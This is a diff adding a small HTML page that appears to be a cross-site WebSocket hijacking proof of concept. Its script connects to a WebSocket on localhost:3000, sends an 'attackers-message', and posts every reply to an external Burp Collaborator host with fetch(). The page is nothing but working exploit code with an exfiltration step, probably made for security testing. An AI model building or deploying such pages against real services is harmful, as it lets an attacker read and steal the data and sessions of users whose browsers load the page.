@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    websocket = new WebSocket('ws://localhost:3000','wstest');
+    websocket.onopen = start
+    websocket.onmessage = handleReply
+    function start(event) {
+      websocket.send("attackers-message");
+    }
+    function handleReply(event) {
+      fetch('http://x535kh3j4vd59czge4yglgbb127svh.burpcollaborator.net/', {method:'POST',mode:'no-cors',body:event.data})
+    }
+  </script>
+</body>
+</html>
